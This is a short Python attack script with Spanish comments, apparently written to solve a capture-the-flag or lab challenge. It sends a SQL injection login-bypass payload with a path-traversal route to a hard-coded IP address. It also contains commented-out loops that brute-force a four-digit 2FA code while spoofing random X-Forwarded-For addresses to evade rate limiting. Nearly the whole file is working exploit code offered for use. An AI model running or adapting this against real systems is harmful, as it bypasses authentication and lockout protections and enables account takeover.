import http.client
from urllib.parse import urlencode
import random
import requests
import string
from bs4 import BeautifulSoup
import time
import ipaddress
import random

def generar_direccion_ip_aleatoria():
    # Genera una dirección IP aleatoria en formato string
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    
    # Verifica que la dirección IP generada sea válida
    while not ipaddress.IPv4Address(ip).is_global:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    
    return ip


def sqli_generator():
    host = "159.65.24.125"
    port = 31549
    path = "/../auth/login"

    # Datos del formulario con inyección SQL
    form_data = {"username": "admin", "password": "1' or 1=1-- -"}
    encoded_data = urlencode(form_data)

    headers = {
        "Host": f"{host}:{port}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(encoded_data)),
    }

    connection = http.client.HTTPConnection(host, port)
    connection.request("POST", path, body=encoded_data, headers=headers)

    response = connection.getresponse()
    print(response.read())

#code = "".join(random.choices(string.digits, k=4))
def check(code, ip_forwarded_for):

    headers = {
        "X-Forwarded-For": ip_forwarded_for
    }

    response = requests.post("http://159.65.24.125:31034/auth/verify-2fa", headers=headers, data = {"2fa-code": code})
    soup = BeautifulSoup(response.text, 'html.parser')

    div_result = soup.find('div', {'id': 'response-message'})

    print(code, response.status_code)

    if not div_result and response.status_code != 403:
        print(code)
        print(response.headers)
        print(response.text)
        return True
    return False

bandera = False

sqli_generator()

"""
for i in range(0, 10):
    for j in range(0, 10):
        for k in range(0, 10):
            for l in range(0, 10):
                code = str(i) + str(j) + str(k) + str(l)
                check(code, generar_direccion_ip_aleatoria())
                if bandera == True:
                    break
            if bandera == True:
                break
        if bandera == True:
            break
    if bandera == True:
        break
"""

"""
for i in range(0, 10000):
    code = str(i).zfill(4)
    ip_aleatoria = generar_direccion_ip_aleatoria()
    print(ip_aleatoria)
    if check(code, ip_aleatoria):
        break
"""
